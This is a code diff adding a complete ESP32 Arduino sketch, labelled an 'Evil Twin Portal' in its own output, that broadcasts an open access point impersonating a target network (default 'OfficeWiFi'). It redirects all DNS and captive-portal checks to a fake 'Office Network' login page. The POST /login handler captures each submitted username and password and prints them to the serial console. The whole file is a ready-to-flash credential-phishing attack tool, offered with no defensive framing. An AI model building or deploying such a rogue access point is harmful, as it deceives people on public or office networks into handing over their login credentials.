@@ -1,0 +1,273 @@
+#include <WiFi.h>
+#include <AsyncTCP.h>
+#include <ESPAsyncWebServer.h>
+#include <DNSServer.h>
+
+const char* AP_SSID = "OfficeWiFi";      // Ganti dengan SSID target
+const char* AP_PASS = NULL;              // Open network
+const char* REAL_PASSWORD = "company123"; // Password yang benar
+
+const byte DNS_PORT = 53;
+DNSServer dnsServer;
+AsyncWebServer server(80);
+
+bool clientAuthenticated = false;
+String capturedUsername = "";
+String capturedPassword = "";
+
+// HTML Login Page
+const char loginHTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Office Network Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+        }
+        h2 {
+            color: #333;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        input[type="text"]:focus, 
+        input[type="password"]:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+        }
+        .error {
+            color: #e74c3c;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .success {
+            color: #27ae60;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: bold;
+            color: #667eea;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">OFFICE NETWORK</div>
+        <h2>Secure Login Required</h2>
+        
+        %MESSAGE%
+
+        <form action='/login' method='post'>
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Enter your username" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit">Connect to Network</button>
+        </form>
+        
+        <p style="text-align: center; font-size: 12px; color: #666; margin-top: 20px;">
+            By connecting, you agree to our network policies
+        </p>
+    </div>
+</body>
+</html>
+)rawliteral";
+
+String getLoginPage(const String& message = "") {
+    String page = FPSTR(loginHTML);
+    if (!message.isEmpty()) {
+        page.replace("%MESSAGE%", "<div class='error'>" + message + "</div>");
+    } else {
+        page.replace("%MESSAGE%", "<div class='success'>Please login to access the network</div>");
+    }
+    return page;
+}
+
+String getSuccessPage() {
+    return R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Access Granted</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            margin: 0;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .success-container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 400px;
+        }
+        h2 {
+            color: #27ae60;
+            margin-bottom: 20px;
+        }
+        .checkmark {
+            font-size: 48px;
+            color: #27ae60;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="success-container">
+        <div class="checkmark">✓</div>
+        <h2>Authentication Successful!</h2>
+        <p>You now have access to the network.</p>
+        <p>You will be redirected shortly...</p>
+    </div>
+    <script>
+        setTimeout(function() {
+            window.location.href = 'http://www.google.com';
+        }, 3000);
+    </script>
+</body>
+</html>
+)rawliteral";
+}
+
+void setup() {
+    Serial.begin(115200);
+    delay(1000);
+
+    Serial.println("\n🚀 Starting Evil Twin Portal");
+    Serial.println("=============================");
+
+    // Setup Access Point
+    WiFi.softAP(AP_SSID, AP_PASS);
+    
+    Serial.print("📶 AP Started: ");
+    Serial.println(AP_SSID);
+    Serial.print("📍 IP Address: ");
+    Serial.println(WiFi.softAPIP());
+    Serial.print("📡 MAC Address: ");
+    Serial.println(WiFi.softAPmacAddress());
+
+    // Setup DNS Server for Captive Portal
+    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+    Serial.println("🔧 DNS Server started");
+
+    // Setup Web Server Routes
+    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
+        if (clientAuthenticated) {
+            request->send(200, "text/html", getSuccessPage());
+        } else {
+            request->send(200, "text/html", getLoginPage());
+        }
+    });
+
+    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
+        if (request->hasArg("username") && request->hasArg("password")) {
+            capturedUsername = request->arg("username");
+            capturedPassword = request->arg("password");
+
+            Serial.println("\n🔐 Login Attempt Captured");
+            Serial.println("========================");
+            Serial.print("👤 Username: ");
+            Serial.println(capturedUsername);
+            Serial.print("🔒 Password: ");
+            Serial.println(capturedPassword);
+            Serial.print("✅ Correct Password: ");
+            Serial.println(REAL_PASSWORD);
+            Serial.println("========================");
+
+            if (capturedPassword == REAL_PASSWORD) {
+                clientAuthenticated = true;
+                Serial.println("🎉 CLIENT AUTHENTICATED SUCCESSFULLY!");
+                request->send(200, "text/html", getSuccessPage());
+            } else {
+                Serial.println("❌ INVALID PASSWORD - KEEPING IN CAPTIVE PORTAL");
+                request->send(200, "text/html", getLoginPage("Invalid password. Please try again."));
+            }
+        } else {
+            request->send(200, "text/html", getLoginPage("Please enter both username and password."));
+        }
+    });
+
+    // Captive Portal Detection Routes
+    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
+        request->redirect("/");
+    });
+    
+    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
+        request->redirect("/");
+    });
+    
+    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
+        request->redirect("/");
+    });
+
+    server.begin();
+    Serial.println("🌐 Web Server started");
+    Serial.println("==================================");
+    Serial.println("📱 Connect to WiFi: " + String(AP_SSID));
+    Serial.println("🌐 Then open any website to see login portal");
+    Serial.println("==================================");
+}
+
+void loop() {
+    dnsServer.processNextRequest();
+    delay(10);
+}
